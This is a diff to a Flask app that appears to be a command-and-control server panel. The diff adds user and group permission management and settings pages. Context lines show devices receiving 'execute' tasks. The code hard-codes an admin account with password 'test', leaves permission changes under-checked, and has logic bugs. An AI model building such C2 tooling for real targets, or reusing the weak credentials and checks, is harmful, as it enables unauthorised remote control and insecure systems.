@@ -14,6 +14,10 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
 
 db = SQLAlchemy()
 
+global allPermissions
+allPermissions = ['change_user_password', 'change_admin_password', 'change_user_permissions',
+                  'change_admin_permissions']
+
 class User(db.Model):
     """A User in the database
     """
@@ -23,7 +27,31 @@ class User(db.Model):
     password = db.Column(db.String)
     authenticated = db.Column(db.Boolean, default=False)
     groups = db.Column(db.String, default='users')
-    permissions = db.Column(db.String)
+    administrator = db.Column(db.Boolean, default=False)
+    change_user_passwords = db.Column(db.Boolean, default=False)
+    change_admin_passwords = db.Column(db.Boolean, default=False)
+    change_user_permissions = db.Column(db.Boolean, default=False)
+    change_admin_permissions = db.Column(db.Boolean, default=False)
+
+    def has_permission(self, permission:str) -> bool:
+        """
+        Check if the user has a specific permission.
+
+        Args:
+            permission (str): The permission to check.
+
+        Returns:
+            bool: True if the user has the permission, False otherwise.
+        """
+        permsList = ['change_user_passwords', 'change_admin_passwords',
+                     'change_user_permissions', 'change_admin_permissions', 'administrator']
+        if permission not in permsList: return False
+        if getattr(self, permission):
+            return getattr(self, permission)
+        for group in self.groups.split(','):#Use order as priority? Assume group exists
+            currentGroup = Group.query.filter_by(name=group)[0]
+            if getattr(currentGroup, permission): return True
+        return False
 
     def is_active(self):
         """True, as all users are active."""
@@ -47,7 +75,11 @@ class Group(db.Model):
     
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String)
-    permissions = db.Column(db.String)
+    administrator = db.Column(db.Boolean, default=False)
+    change_user_passwords = db.Column(db.Boolean, default=False)
+    change_admin_passwords = db.Column(db.Boolean, default=False)
+    change_user_permissions = db.Column(db.Boolean, default=False)
+    change_admin_permissions = db.Column(db.Boolean, default=False)
     
 class Device(db.Model):
     """A Device connected to the server
@@ -135,15 +167,61 @@ def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
     passw = str(bcrypt.hashpw(passw, salt))[2:-1]
     groups = ['users']
     if isAdmin: groups.append('admins')
-    newUser = User(username=username, password=str(passw), groups=",".join(groups))
+    newUser = User(username=username, administrator = isAdmin, password=str(passw), groups=",".join(groups))
     db.session.add(newUser)
     db.session.commit()
     return 'Account created successfully'
 
+def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = False, change_admin_passwords:bool = False, change_user_permissions:bool = False, change_admin_permissions:bool = False) -> str:
+    """
+    Add a group to the database.
+
+    Args:
+        name (str): The name of the group to add.
+        administrator (bool, optional): Whether the group should have administrator privileges.
+            Defaults to False.
+        change_user_passwords (bool, optional): Whether the group should be able to change user passwords.
+            Defaults to False.
+        change_admin_passwords (bool, optional): Whether the group should be able to change admin passwords.
+            Defaults to False.
+        change_user_permissions (bool, optional): Whether the group should be able to change user permissions.
+            Defaults to False.
+        change_admin_permissions (bool, optional): Whether the group should be able to change admin permissions.
+            Defaults to False.
+
+    Returns:
+        str: A message indicating whether the group was created successfully.
+    """
+    # Check if required fields are provided
+    if not name: return "Group name is required"
+
+    # Check if the group already exists
+    group = Group.query.filter_by(name=name)
+    if group: return "A group with this name already exists"
+
+    # Create the new group
+    new_group = Group(
+        name=name,
+        administrator=administrator,
+        change_user_passwords=change_user_passwords,
+        change_admin_passwords=change_admin_passwords,
+        change_user_permissions=change_user_permissions,
+        change_admin_permissions=change_admin_permissions
+    )
+    
+    # Add the new group to the database
+    db.session.add(new_group)
+    db.session.commit()
+
+    return 'Group created successfully'
+
+
 #Startup checks
 with app.app_context():
-    a = addAccount('admin', 'test', True)
-    a = None
+    a = addAccount('admin', 'test', True)#group  adds if not unique, stop this
+    a = addGroup('admins', True, True, True, True, True)
+    a = addGroup('users')
+    
     #Delete all known links for devices, so new can be generated
     if Device.query.all():
         for dev in Device.query.all():
@@ -181,6 +259,11 @@ def loginPage():
         If the user is remembered (i.e., logged in previously), it redirects to the 'overviewPage'.
         Otherwise, it renders the 'logIn.html' template with the 'error' variable.
     """
+    try:
+        del flask.session['users']
+        del flask.session['groups']
+    except:
+        pass
     error = None
     if flask.request.method == 'POST':
         if valid_login(flask.request.form['username'],
@@ -232,7 +315,6 @@ def clientsPage():
         return flask.render_template('clients.html', clients = Device.query.all())
     else:
         if Device.query.filter_by(jwt=flask.request.form['jwt']).all():
-            print('found')
             if flask.request.form['action'] == 'execute':
                 task = Task(id=generateRandPath(), owner=flask.request.form['jwt'],
                             command='execute', arguments=flask.request.form['arguments'])
@@ -242,14 +324,38 @@ def clientsPage():
             return flask.render_template('clients.html', clients = Device.query.all())
         return flask.render_template('clients.html', clients = Device.query.all())
 
-@app.route('/reset_password', methods=['GET', 'POST'])
+@app.route('/settings')
 @flask_login.fresh_login_required
-def resetPassPage():
+def settingsPage():
+    return flask.render_template('settings.html')
+
+@app.route('/settings/change_password', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def changePassPage():
+    """
+    Route for resetting user passwords. Requires fresh login. If a user has the permissions 
+    to change both user and admin passwords, all users are shown. If a user has the permission 
+    to change only user passwords, only non-admin users are shown. If a user has the permission 
+    to change only admin passwords, only admin users are shown. If a user does not have the 
+    permissions to change any passwords, only the current user is shown. If a user submits a 
+    password reset form, the password is updated in the database if the passwords match and the 
+    username is valid. Returns the rendered changePassword.html template with a list of users 
+    to choose from.
+    """
     user = flask_login.current_user
-    if not 'admins' in user.groups.split(','):#make reliant on groups/users with specific permission
-        flask.flash('You do not have the necessary permissions to view this page', 'error')
-        return flask.abort(404)
-    users = User.query.all()
+    aUsers = User.query.all()
+    if not user.has_permission('change_user_passwords') and not user.has_permission('change_admin_passwords'):
+        users = user
+    elif user.has_permission('change_user_passwords') and user.has_permission('change_admin_passwords'):
+        users = aUsers
+    elif user.has_permission('change_user_passwords'):
+        users = []
+        for user in aUsers:
+            if not 'admins' in user.groups.split(","): users.append(user)
+    else:
+        users = []
+        for user in aUsers:
+            if 'admins' in user.groups.split(","): users.append(user)
     users = [user.username for user in users]
     if flask.request.method == 'POST':
         try:
@@ -257,14 +363,94 @@ def resetPassPage():
                 flask.flash('The given passwords do not match', 'error')
             else:
                 user = User.query.get(flask.request.form['users'])
+                users.index(user.username)#Check if user is available for them to edit
                 passw = flask.request.form['password'].encode('utf-8')
                 user.password = str(bcrypt.hashpw(passw, bcrypt.gensalt(12)))[2:-1]
                 db.session.commit()
-                flask.flash('Password reset', 'success')
+                flask.flash('Password has been changed', 'success')
         except:
             flask.flash('An invalid username was given', 'error')
-    return flask.render_template('resetPassword.html', users = users)
-            
+    return flask.render_template('changePassword.html', users = users)
+
+@app.route('/settings/change_permissions')
+@flask_login.fresh_login_required
+def selectChangePermsPage():
+    user = flask_login.current_user
+    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
+        flask.flash('You do not have access to this page', 'error')
+        flask.abort(400)
+    users = []
+    groups = []
+    if user.has_permission('change_user_permissions') or user.has_permission('change_admin_permissions'):
+        aUsers = User.query.all()
+        if user.has_permission('change_user_permissions') and user.has_permission('change_admin_permissions'):
+            groups = Group.query.all()
+            users = aUsers
+        elif user.has_permission('change_user_permissions'):
+            for u in aUsers:
+                if not u.has_permission('administrator'): users.append(u)
+            groups = Group.query.filter_by(admin=False).all()
+        else:
+            for u in aUsers:
+                if u.has_permission('administrator'): users.append(u)
+            groups = Group.query.filter_by(admin=True).all()
+    flask.session['users'] = [u.username for u in users]
+    flask.session['groups'] = [g.name for g in groups]
+    return flask.render_template('selectChangePermissions.html', users = flask.session['users'], groups = flask.session['groups'])
+
+@app.route('/settings/change_permissions/select', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def changePermsPage():
+    user = flask_login.current_user
+    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
+        flask.flash('You do not have access to this page', 'error')
+        flask.abort(400)
+    try:
+        print(flask.request.form)
+        try:
+            users = flask.request.args['users']
+            flask.session['users'].index(users)
+        except:
+            groups = flask.request.args['groups']
+            flask.session['groups'].index(groups)
+            users = None
+        if users:
+            target = 'users'
+            selected = User.query.filter_by(username=users).first()
+        else:
+            target = 'groups'
+            selected = Group.query.filter_by(name = groups).first()
+        print(flask.session['users'])
+        print(target)
+        print(selected)
+        if flask.request.method == 'GET':
+            return flask.render_template('changePermissions.html', target = target, selected = selected, isAdmin = user.administrator, editAdmins = user.has_permission('change_admin_permissions'))
+        else:#probably need more verification/security checks on this
+            if flask.request.form.get('selectAdmin'): selected.administrator = True
+            else: selected.administrator = False
+            if flask.request.form.get('selectEditAdmins'): selected.change_admin_permissions = True
+            else: selected.change_admin_permissions = False
+            if flask.request.form.get('selectEditUsers'): selected.change_user_permissions = True
+            else: selected.change_user_permissions = False
+            if flask.request.form.get('selectChangeAdminPW'): selected.change_admin_passwords = True
+            else: selected.change_admin_passwords = False
+            if flask.request.form.get('selectChangeUserPW'): selected.change_user_passwords = True
+            else: selected.change_user_passwords = False
+            flask.flash('Permissions have been changed', 'success')
+            db.session.commit()
+    except Exception as e:
+        try:
+            del flask.session['users']
+            del flask.session['groups']
+        except:
+            pass
+        flask.flash('An invalid target was given', 'error')
+        print(e)
+        return flask.redirect(flask.url_for('selectChangePermsPage'))
+    try:
+        return flask.redirect(flask.url_for('changePermsPage', users=flask.request.args['users']))
+    except:
+        return flask.redirect(flask.url_for('changePermsPage', groups=flask.request.args['groups']))
 
 #C2 interface
 def validateC2Client(request:flask.request) -> bool:
@@ -372,7 +558,7 @@ def instructReponsePages(c2ID:str, pName:str):
         db.session.commit()
         tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
         if not tasks: return ""
-        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')
+        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')#Don't return redirect, just return code 200
 
 #Run forever
 def start_server(port:int):
